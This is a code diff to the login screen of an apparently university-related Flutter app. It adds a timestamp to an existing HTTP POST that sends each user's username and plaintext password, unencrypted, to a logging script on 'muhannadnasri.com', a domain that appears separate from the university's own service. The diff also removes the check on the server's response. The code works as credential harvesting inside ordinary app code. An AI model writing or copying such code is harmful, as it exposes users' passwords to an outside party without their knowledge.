@@ -11,6 +11,7 @@ import 'package:path_provider/path_provider.dart';
 import 'package:skyline_university/Global/global.dart';
 import 'package:skyline_university/Global/zigzag.dart';
 import 'package:url_launcher/url_launcher.dart';
+import 'package:intl/intl.dart';
 
 void main() => runApp(HomeLogin());
 
@@ -29,6 +30,8 @@ class HomeLogin extends StatefulWidget {
 }
 
 class _HomeLoginState extends State<HomeLogin> {
+    String formattedDate = DateFormat('yyyy-MM-dd hh:mm').format(DateTime.now());
+
   final GlobalKey<ScaffoldState> _scaffoldKey = new GlobalKey<ScaffoldState>();
   Map<String, String> body;
   File dataFile;
@@ -1315,17 +1318,17 @@ getLogs();
 
     // print('Running on ${androidInfo.model}');
     try {
-      final response = await http.post(
+       await http.post(
         Uri.encodeFull('http://muhannadnasri.com/App/logLogin.php'),
         body: {
           'username': username,
           'password':password,
           'userType':studentJson['data']['user_type'],
+          'date': formattedDate,
+
         },
       );
-      if (response.statusCode == 200) {
-     print('done');
-      }
+     
     } catch (x) {
       print(x);
     }
